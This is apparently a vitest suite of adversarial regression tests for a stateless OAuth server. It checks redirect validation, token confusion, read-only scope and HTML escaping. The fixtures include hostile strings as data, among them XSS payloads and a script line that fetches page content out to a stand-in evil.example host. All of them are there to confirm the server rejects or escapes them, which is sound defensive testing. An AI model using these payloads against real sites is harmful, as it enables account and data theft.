/**
 * Adversarial regression tests for the hosted flow: the attacks a stateless
 * OAuth server invites, each one pinned so it stays closed.
 */
import { afterEach, describe, expect, it } from 'vitest';
import { createApp, isAllowedRedirectUri, MAX_REDIRECT_URI } from '../src/http/app.js';
import type { Env } from '../src/http/env.js';
import { s256 } from '../src/oauth/pkce.js';
import { importSealKey, seal, unseal } from '../src/oauth/seal.js';
import {
  API,
  installFetch,
  installationsRoute,
  MCP_HEADERS,
  repoJson,
  reposRoute,
  rpc,
  testEnv,
  TOKEN_ROUTE,
  VIEWER_ROUTE,
  type FetchMock,
  type Route
} from './http-helpers.js';

const REDIRECT = 'http://127.0.0.1:33418/oauth/callback';
const VERIFIER = 'K6cA0dPqLm3xTb7VgYhN1sRw9ZeUj4iOpQ2fXcMvBnH';

let mock: FetchMock | undefined;
afterEach(() => {
  mock?.restore();
  mock = undefined;
});

const app = () => createApp({ log: () => {}, sleep: async () => {}, createPollMs: 0 });
type App = ReturnType<typeof app>;

async function register(server: App, env: Env, clientName = 'Test Client', uris = [REDIRECT]) {
  const response = await server.request(
    '/register',
    {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ redirect_uris: uris, client_name: clientName })
    },
    env
  );
  return { status: response.status, body: (await response.json()) as Record<string, string> };
}

async function authorize(server: App, env: Env, clientId: string, extra: Record<string, string> = {}) {
  const query = new URLSearchParams({
    response_type: 'code',
    client_id: clientId,
    redirect_uri: REDIRECT,
    code_challenge: await s256(VERIFIER),
    code_challenge_method: 'S256',
    state: 'client-state-42',
    ...extra
  });
  return server.request(`/authorize?${query.toString()}`, {}, env);
}

/** register -> authorize -> GitHub -> /callback, returning the setup page's HTML. */
async function setupPageFor(
  server: App,
  env: Env,
  options: { clientName?: string; scope?: string; routes?: Route[] } = {}
) {
  mock = installFetch([
    TOKEN_ROUTE,
    VIEWER_ROUTE,
    installationsRoute([{ id: 5 }]),
    reposRoute(5, ['intreaction/one', 'intreaction/two']),
    ...(options.routes ?? [])
  ]);
  const client = await register(server, env, options.clientName ?? 'Test Client');
  const started = await authorize(
    server,
    env,
    client.body.client_id!,
    options.scope ? { scope: options.scope } : {}
  );
  const state = new URL(started.headers.get('location')!).searchParams.get('state')!;
  const callback = await server.request(
    `/callback?code=gh_code&state=${encodeURIComponent(state)}`,
    {},
    env
  );
  const html = await callback.text();
  return { html, response: callback, pick: /name="pick" value="([^"]+)"/.exec(html)![1]! };
}

function form(fields: Record<string, string>): RequestInit {
  return {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams(fields).toString()
  };
}

describe('redirect_uri validation', () => {
  it('accepts https and every loopback spelling, and nothing else', () => {
    expect(isAllowedRedirectUri('https://claude.ai/api/mcp/auth_callback')).toBe(true);
    expect(isAllowedRedirectUri('http://localhost:1234/cb')).toBe(true);
    expect(isAllowedRedirectUri('http://127.0.0.1:33418/cb')).toBe(true);
    expect(isAllowedRedirectUri('http://[::1]:33418/cb')).toBe(true);
    // Not loopback, not https, credentials, a fragment, or a hostile scheme.
    expect(isAllowedRedirectUri('http://localhost.evil.example/cb')).toBe(false);
    expect(isAllowedRedirectUri('http://127.0.0.1.evil.example/cb')).toBe(false);
    expect(isAllowedRedirectUri('http://evil.example/cb')).toBe(false);
    expect(isAllowedRedirectUri('https://user:pass@evil.example/cb')).toBe(false);
    expect(isAllowedRedirectUri('https://evil.example/cb#frag')).toBe(false);
    expect(isAllowedRedirectUri('javascript:alert(1)')).toBe(false);
    expect(isAllowedRedirectUri('data:text/html,x')).toBe(false);
    expect(isAllowedRedirectUri('not a url')).toBe(false);
  });

  it('caps the length, so one registration cannot inflate every token it is sealed into', async () => {
    expect(isAllowedRedirectUri(`https://evil.example/${'a'.repeat(MAX_REDIRECT_URI)}`)).toBe(false);

    const env = testEnv();
    const huge = Array.from({ length: 20 }, (_, i) => `https://evil.example/${'a'.repeat(4000)}${i}`);
    const rejected = await register(app(), env, 'Bloat', huge);
    expect(rejected.status).toBe(400);
    expect(rejected.body.error).toBe('invalid_redirect_uri');

    // A legitimate registration's client_id stays small enough to ride inside
    // every later token and still fit an Authorization header.
    const accepted = await register(app(), env);
    expect(accepted.status).toBe(201);
    expect(accepted.body.client_id!.length).toBeLessThan(1024);
  });

  it('refuses to redirect anywhere the client did not register', async () => {
    const env = testEnv();
    const server = app();
    const client = await register(server, env);
    const query = new URLSearchParams({
      response_type: 'code',
      client_id: client.body.client_id!,
      redirect_uri: 'https://evil.example/steal',
      code_challenge: await s256(VERIFIER),
      code_challenge_method: 'S256'
    });
    const response = await server.request(`/authorize?${query}`, {}, env);
    expect(response.status).toBe(400);
    expect(response.headers.get('location')).toBeNull();
    expect(await response.text()).toContain('not registered');
  });
});

describe('token type confusion', () => {
  it('never accepts one kind of sealed token in another kind of slot', async () => {
    const env = testEnv();
    const server = app();
    const key = await importSealKey(env.OPENSTORE_SEAL_KEY);
    const client = await register(server, env);
    const started = await authorize(server, env, client.body.client_id!);
    const state = new URL(started.headers.get('location')!).searchParams.get('state')!;
    const access = await seal(key, 'access', {
      t: 'access',
      client_id: client.body.client_id!,
      gh_access: 'gho_x',
      repo: 'intreaction/one',
      readonly: false,
      ttlSeconds: 60
    });

    // A state token is not a client_id.
    const asClient = await server.request(
      `/authorize?response_type=code&client_id=${encodeURIComponent(state)}` +
        `&redirect_uri=${encodeURIComponent(REDIRECT)}&code_challenge=${await s256(VERIFIER)}` +
        '&code_challenge_method=S256',
      {},
      env
    );
    expect(asClient.status).toBe(400);

    // Neither a state nor an access token is an authorization code.
    for (const candidate of [state, access]) {
      const response = await server.request(
        '/token',
        form({ grant_type: 'authorization_code', code: candidate, code_verifier: VERIFIER }),
        env
      );
      expect(response.status).toBe(400);
      expect(((await response.json()) as { error: string }).error).toBe('invalid_grant');
    }

    // An access token is not a refresh token.
    const asRefresh = await server.request(
      '/token',
      form({ grant_type: 'refresh_token', refresh_token: access }),
      env
    );
    expect(asRefresh.status).toBe(400);

    // A state token is not a bearer, and neither is the client_id.
    for (const candidate of [state, client.body.client_id!]) {
      const response = await server.request(
        '/mcp',
        { method: 'POST', headers: { ...MCP_HEADERS, authorization: `Bearer ${candidate}` }, body: rpc('tools/list') },
        env
      );
      expect(response.status).toBe(401);
    }

    // A state token is not a pick token.
    const asPick = await server.request('/callback/setup', form({ pick: state, action: 'create' }), env);
    expect(asPick.status).toBe(400);
    expect(await asPick.text()).toContain('expired');
  });
});

describe('read-only can never be downgraded', () => {
  it('keeps store:readonly through the setup form', async () => {
    const env = testEnv();
    const server = app();
    const { pick } = await setupPageFor(server, env, {
      scope: 'store:readonly',
      routes: [
        {
          method: 'POST',
          url: `${API}/repos/intreaction/openstore-template/generate`,
          status: 201,
          body: repoJson('intreaction/my-openstore')
        },
        { url: `${API}/repos/intreaction/my-openstore`, body: repoJson('intreaction/my-openstore') }
      ]
    });
    // The form deliberately omits `readonly`; the sealed state must still win.
    const done = await server.request(
      '/callback/setup',
      form({ pick, action: 'create', name: 'my-openstore' }),
      env
    );
    const code = new URL(done.headers.get('location')!).searchParams.get('code')!;
    const key = await importSealKey(env.OPENSTORE_SEAL_KEY);
    expect((await unseal(key, code, 'code')).readonly).toBe(true);
  });

  it('ignores a scope or resource the client tries to widen on refresh', async () => {
    const env = testEnv();
    const server = app();
    const key = await importSealKey(env.OPENSTORE_SEAL_KEY);
    mock = installFetch([TOKEN_ROUTE]);
    const refresh = await seal(key, 'refresh', {
      t: 'refresh',
      client_id: 'cid',
      gh_refresh: 'ghr_x',
      repo: 'intreaction/locked',
      readonly: true,
      ttlSeconds: 600
    });
    const response = await server.request(
      '/token',
      form({
        grant_type: 'refresh_token',
        refresh_token: refresh,
        scope: 'store',
        resource: 'https://evil.example/mcp'
      }),
      env
    );
    const body = (await response.json()) as { access_token: string; scope: string };
    expect(body.scope).toBe('store:readonly');
    const access = await unseal(key, body.access_token, 'access');
    expect(access.readonly).toBe(true);
    // The repository is the one the original grant named, never one the client asked for.
    expect(access.repo).toBe('intreaction/locked');
  });
});

/**
 * The returning-user path used to redirect straight to the client with a code.
 * Registration is open, so that let one crafted link carry an already-authorized
 * user through to a token for a client they never chose. It now stops on a page.
 */
describe('a returning user is never carried through silently', () => {
  /** register -> authorize -> GitHub -> /callback for a user who already has a store. */
  async function confirmPageFor(
    server: App,
    env: Env,
    options: { clientName?: string; scope?: string } = {}
  ) {
    mock = installFetch([
      TOKEN_ROUTE,
      VIEWER_ROUTE,
      installationsRoute([{ id: 5 }]),
      reposRoute(5, ['intreaction/my-openstore', 'intreaction/website']),
      {
        url: `${API}/repos/intreaction/my-openstore/contents/CONTEXT.md`,
        body: { name: 'CONTEXT.md', type: 'file' }
      },
      { url: /\/contents\/CONTEXT\.md$/, status: 404, body: { message: 'Not Found' } }
    ]);
    const client = await register(server, env, options.clientName ?? 'Claude Code');
    const started = await authorize(
      server,
      env,
      client.body.client_id!,
      options.scope ? { scope: options.scope } : {}
    );
    const state = new URL(started.headers.get('location')!).searchParams.get('state')!;
    const response = await server.request(
      `/callback?code=gh_code&state=${encodeURIComponent(state)}`,
      {},
      env
    );
    const html = await response.text();
    return { client, response, html, pick: /name="pick" value="([^"]+)"/.exec(html)![1]! };
  }

  it('renders a confirmation page instead of redirecting to the client', async () => {
    const env = testEnv();
    const { response, html } = await confirmPageFor(app(), env);
    expect(response.status).toBe(200);
    // The one thing that must not happen: a code leaving without a click.
    expect(response.headers.get('location')).toBeNull();
    expect(html).not.toContain('127.0.0.1:33418');
    expect(html).toContain('Connect to Claude Code');
    expect(html).toContain('intreaction/my-openstore');
    expect(html).toContain('this computer');
    expect(html).toContain('If you did not just ask an AI client to connect, close this tab.');
    expect(html).toContain('Use a different repository');
    expect(html).not.toContain('<script');
    expect(html).not.toContain('gho_user_token');
    expect(response.headers.get('cache-control')).toBe('no-store');
    expect(response.headers.get('x-frame-options')).toBe('DENY');
    expect(response.headers.get('referrer-policy')).toBe('no-referrer');
    expect(response.headers.get('content-security-policy')).toContain("default-src 'none'");
  });

  it('issues a code only once the user confirms', async () => {
    const env = testEnv();
    const server = app();
    const { pick } = await confirmPageFor(server, env);
    const done = await server.request(
      '/callback/confirm',
      form({ pick, action: 'connect', repo: 'intreaction/my-openstore' }),
      env
    );
    expect(done.status).toBe(302);
    const back = new URL(done.headers.get('location')!);
    expect(back.origin + back.pathname).toBe(REDIRECT);
    expect(back.searchParams.get('state')).toBe('client-state-42');
    const key = await importSealKey(env.OPENSTORE_SEAL_KEY);
    const code = await unseal(key, back.searchParams.get('code')!, 'code');
    expect(code.repo).toBe('intreaction/my-openstore');
    expect(code.readonly).toBe(false);
  });

  it('offers the full setup page when the user wants a different repository', async () => {
    const env = testEnv();
    const server = app();
    const { pick } = await confirmPageFor(server, env);
    const response = await server.request('/callback/confirm', form({ pick, action: 'choose' }), env);
    expect(response.status).toBe(200);
    expect(response.headers.get('location')).toBeNull();
    const html = await response.text();
    expect(html).toContain('Create my OpenStore');
    expect(html).toContain('intreaction/website');
  });

  it('refuses a repository that is not in the sealed pick list', async () => {
    const env = testEnv();
    const server = app();
    const { pick } = await confirmPageFor(server, env);
    const response = await server.request(
      '/callback/confirm',
      form({ pick, action: 'connect', repo: 'someone-else/private' }),
      env
    );
    expect(response.status).toBe(400);
    expect(response.headers.get('location')).toBeNull();
    expect(await response.text()).toContain('Choose one of the repositories');
  });

  it('refuses a wrong token type and an expired pick', async () => {
    const env = testEnv();
    const server = app();
    const key = await importSealKey(env.OPENSTORE_SEAL_KEY);
    const client = await register(server, env);
    const started = await authorize(server, env, client.body.client_id!);
    const state = new URL(started.headers.get('location')!).searchParams.get('state')!;

    // A `state` token is not a `pick` token, however valid it is elsewhere.
    const wrongType = await server.request(
      '/callback/confirm',
      form({ pick: state, action: 'connect', repo: 'intreaction/my-openstore' }),
      env
    );
    expect(wrongType.status).toBe(400);
    expect(await wrongType.text()).toContain('expired');

    const expired = await seal(key, 'pick', {
      t: 'pick',
      client_id: client.body.client_id!,
      redirect_uri: REDIRECT,
      code_challenge: await s256(VERIFIER),
      client_state: 'client-state-42',
      readonly: false,
      gh_access: 'gho_x',
      repos: ['intreaction/my-openstore'],
      login: 'intreaction',
      expiresAt: 1
    });
    const stale = await server.request(
      '/callback/confirm',
      form({ pick: expired, action: 'connect', repo: 'intreaction/my-openstore' }),
      env
    );
    expect(stale.status).toBe(400);
    expect(stale.headers.get('location')).toBeNull();
    expect(await stale.text()).toContain('expired');
  });

  it('keeps store:readonly through the confirmation', async () => {
    const env = testEnv();
    const server = app();
    const { html, pick } = await confirmPageFor(server, env, { scope: 'store:readonly' });
    expect(html).toContain('Read-only access');

    // The form carries no read-only field at all; the sealed pick is the authority.
    const done = await server.request(
      '/callback/confirm',
      form({ pick, action: 'connect', repo: 'intreaction/my-openstore' }),
      env
    );
    const key = await importSealKey(env.OPENSTORE_SEAL_KEY);
    const code = await unseal(key, new URL(done.headers.get('location')!).searchParams.get('code')!, 'code');
    expect(code.readonly).toBe(true);
    expect(code.repo).toBe('intreaction/my-openstore');
  });
});

describe('rendered pages', () => {
  it('escapes a hostile client_name and names the client that is connecting', async () => {
    const env = testEnv();
    const { html } = await setupPageFor(app(), env, {
      clientName: '<img src=x onerror="alert(1)">Totally Legit'
    });
    expect(html).not.toContain('<img src=x');
    expect(html).toContain('&lt;img src=x');
    expect(html).toContain('Totally Legit');
    // The redirect host is shown so a user can notice a connection they did not start.
    expect(html).toContain('this computer');
  });

  it('escapes a hostile message coming back from GitHub', async () => {
    const env = testEnv();
    const server = app();
    const { pick } = await setupPageFor(server, env, {
      routes: [
        {
          method: 'POST',
          url: `${API}/repos/intreaction/openstore-template/generate`,
          status: 422,
          body: { message: '<script>fetch("//evil.example?"+document.body.innerHTML)</script>' }
        }
      ]
    });
    const response = await server.request(
      '/callback/setup',
      form({ pick, action: 'create', name: 'my-openstore' }),
      env
    );
    const html = await response.text();
    expect(html).not.toContain('<script>fetch');
    expect(html).toContain('&lt;script&gt;');
  });

  it('locks every HTML page down: no script, no framing, no cache, no referrer', async () => {
    const env = testEnv();
    const { response, html } = await setupPageFor(app(), env);
    const csp = response.headers.get('content-security-policy') ?? '';
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(response.headers.get('x-frame-options')).toBe('DENY');
    expect(response.headers.get('cache-control')).toBe('no-store');
    expect(response.headers.get('referrer-policy')).toBe('no-referrer');
    expect(response.headers.get('x-content-type-options')).toBe('nosniff');
    // A page holding a sealed token must never contain a script to hijack.
    expect(html).not.toContain('<script');
  });
});

describe('configuration fails closed', () => {
  it('refuses to run the login flow without the GitHub App id', async () => {
    // Without it, `GET /user/installations` cannot be filtered to our own App,
    // and the setup page would offer repositories another App granted.
    for (const appId of ['', '0', 'not-a-number']) {
      const env = testEnv({ GITHUB_APP_ID: appId });
      const server = app();
      const client = await register(server, env);
      // Registration needs no App; authorization does.
      expect(client.status).toBe(201);
      const response = await authorize(server, env, client.body.client_id!);
      expect(response.status).toBe(500);
      expect(await response.text()).toContain('not configured');
    }
  });

  it('still serves discovery and the protected resource, which need no App id', async () => {
    const env = testEnv({ GITHUB_APP_ID: '' });
    const server = app();
    const metadata = await server.request('/.well-known/oauth-protected-resource', {}, env);
    expect(metadata.status).toBe(200);
    const mcp = await server.request(
      '/mcp',
      { method: 'POST', headers: MCP_HEADERS, body: rpc('tools/list') },
      env
    );
    expect(mcp.status).toBe(401);
  });
});

describe('logging', () => {
  it('records the path of a callback but never its code or state', async () => {
    const entries: string[] = [];
    const server = createApp({
      log: (entry) => entries.push(JSON.stringify(entry)),
      sleep: async () => {},
      createPollMs: 0
    });
    const env = testEnv();
    mock = installFetch([TOKEN_ROUTE, VIEWER_ROUTE, installationsRoute([{ id: 5 }]), reposRoute(5, [])]);
    const client = await register(server, env);
    const started = await authorize(server, env, client.body.client_id!);
    const state = new URL(started.headers.get('location')!).searchParams.get('state')!;
    await server.request(`/callback?code=gh_secret_code&state=${encodeURIComponent(state)}`, {}, env);
    const joined = entries.join('\n');
    expect(joined).toContain('/callback');
    expect(joined).not.toContain('gh_secret_code');
    expect(joined).not.toContain('os1.');
    expect(joined).not.toContain('?');
  });
});
